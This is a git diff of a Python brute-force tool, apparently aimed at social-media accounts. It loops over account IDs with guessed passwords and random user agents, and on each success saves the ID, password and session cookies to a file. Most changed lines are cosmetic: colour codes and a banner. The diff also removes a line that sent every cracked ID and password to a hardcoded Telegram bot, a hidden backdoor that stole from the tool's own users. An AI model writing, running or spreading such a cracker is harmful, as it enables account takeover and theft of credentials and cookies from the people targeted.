@@ -232,6 +232,29 @@ u = '\033[95m' # UNGU
 kk = '\033[33m' # KUNING -
 b = '\33[1;96m' # BIRU -
 p = '\x1b[0;34m' # BIRU +
+a1 = '\x1b[1;31m'  # سور
+a2 = '\x1b[1;34m'  # شین
+a3 = '\x1b[1;32m'  # سەوز
+a4 = '\x1b[1;33m'  # زەرد
+a5 = '\x1b[38;5;208m'  # پرتەقاڵی
+a6 = '\x1b[38;5;5m'  # مۆر
+a7 = '\x1b[38;5;13m'  # پەمەیی
+a8 = '\x1b[1;30m'  # ڕەش
+a9 = '\x1b[1;37m'  # سپی
+a10 = '\x1b[38;5;52m'  # قاوەیی
+a11 = '\x1b[38;5;8m'  # خۆڵەمێشی
+a12 = '\x1b[38;5;220m'  # زێڕین
+a13 = '\x1b[38;5;7m'  # زیوی
+a14 = '\x1b[38;5;153m'  # شینی کاڵ
+a15 = '\x1b[38;5;18m'  # شینی تۆخ
+a16 = '\x1b[38;5;48m'  # سەوزی کاڵ
+a17 = '\x1b[38;5;22m'  # سەوزی تووخ
+a18 = '\x1b[38;5;196m'  # سوری کاڵ
+a19 = '\x1b[38;5;88m'  # سوری توخ
+a20 = '\x1b[38;5;226m'  # زەردی کاڵ
+a21 = '\x1b[38;5;136m'  # زەردی توخ
+a22 = '\x1b[38;5;216m'  # پرتەقاڵی کاڵ
+a23 = '\x1b[38;5;166m'  # پرتەقاڵێ توچ
 asu = random.choice([m,O,h,u,b])
 
 okc = 'X-FILE-OK-'+str(ta)+'.txt'
@@ -289,12 +312,13 @@ def back():
 def banner():
         print("""\x1b[1;96m
         
-
-__  __     _       __     
-   / / / /___ | |     / /___ _
-  / /_/ / __ `/ | /| / / __ `/
- / __  / /_/ /| |/ |/ / /_/ / 
-/_/ /_/\__,_/ |__/|__/\__,_/ 
+                                           
+ _|    _|            _|          _|            
+ _|    _|    _|_|_|  _|          _|    _|_|_|  
+ _|_|_|_|  _|    _|  _|    _|    _|  _|    _|  
+ _|    _|  _|    _|    _|  _|  _|    _|    _|  
+ _|    _|    _|_|_|      _|  _|        _|_|_|  
+                                            
 
 """)
 os.system('clear')
@@ -302,7 +326,7 @@ banner()
 #MENU
 def menu():
        	print()
-        print(f'  \x1b[1;91m1 - CR4CK FILE')
+        print('\x1b[1;91m[ 1 ] CRACK FILE')
         #print(f'\x1b[1;92m╍╌╍╌╍\x1b[1;95m‒╍╌╍╌╍‒\x1b[1;94m╍╌╍╌╍\x1b[1;97m╌╍╌╍╍\x1b[1;96m╌╍╌╍‒╍\x1b[1;93m╌╍╌╍‒╍\x1b[1;91m╌╍╌╍╌╍\x1b[1;92m╌╍╌╍╌╍')
 
         _____BRADOSTI_____ = input('  HALBZHERA : ')
@@ -488,7 +512,7 @@ def passwrd():
 def crack(idf,pwv):
         global loop,ok,cp
         bo = random.choice([m,k,h,b,u,x])
-        sys.stdout.write(f"\r\x1b[1;94m[HaWa🌪️]\x1b[0;90m{Z}{b}{loop}{Z}|{b}{len(id)} \033[33m[\x1b[1;91mOK∙{ok}\33[1;96m {P}{'{:.0%}'.format(loop/float(len(id)))}"),
+        sys.stdout.write(f"\r \x1b[1;31m[\x1b[38;5;13mHaWa\x1b[38;5;208m] ✮ [{loop}×{len(id)}] \x1b[38;5;18m[{ok}] \x1b[1;31m\x1b[1;37m \x1b[1;34m{'{:.0%}'.format(loop/float(len(id)))}  "),
         sys.stdout.flush()
         ua = random.choice(ugen)
         ua2 = random.choice(ugen2)
@@ -542,9 +566,7 @@ def crack(idf,pwv):
                                 ok+=1
                                 coki=po.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                                requests.get(f"https://api.telegram.org/bot7291662040:AAHdeqNUm62e-VlWLjnYL3seA9qgMkABHj4/sendMessage?chat_id=7155363713&text=\r {idf} | {pw}")
-                                
-                                print(f'\r\x1b[1;96m[ HaWa ]\n[✓] USER : {idf} \n[✓] PASS : {pw} \n[✓] COOKIES : {kuki}')
+                                print(f'\r\x1b[38;5;5m[HaWa😱⭐️-OK]\x1b[38;5;220m   {idf} | \x1b[38;5;7m{pw} | \x1b[38;5;48m{kuki}')
                                 open('/sdcard/HaWa-𝑂𝐾.txt','a').write(idf+' | '+pw+'\n')
                                 cek_SURCHY(kuki)
                                 break
